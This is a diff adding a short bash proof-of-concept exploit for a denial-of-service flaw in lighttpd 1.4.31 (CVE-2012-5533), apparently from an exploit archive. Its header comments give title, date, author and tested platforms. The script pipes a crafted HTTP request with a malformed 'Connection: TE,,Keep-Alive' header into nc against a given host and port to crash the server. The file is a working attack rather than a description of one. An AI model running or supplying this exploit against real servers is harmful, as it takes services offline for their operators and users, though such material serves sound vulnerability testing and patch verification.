@@ -1,0 +1,16 @@
+#!/bin/bash
+# Exploit Title: simple lighttpd 1.4.31 DOS POC
+# Date: 11/21/2012
+# Exploit Author: t4c@ghcif.de
+# Vendor Homepage: http://www.lighttpd.net
+# Software Link: http://download.lighttpd.net/lighttpd/releases-1.4.x/lighttpd-1.4.31.tar.gz 
+# Version: 1.4.31
+# Tested on: Debian Linux, Gentoo Linux, Arch Linux
+# CVE: CVE-2012-5533
+
+if [ $# -lt 2 ]
+then
+	echo "usage :$0 <Host/IP> <Port>"
+else
+	echo -ne "GET / HTTP/1.1\r\nHost: pwn.ed\r\nConnection: TE,,Keep-Alive\r\n\r\n" | nc $1 $2
+fi
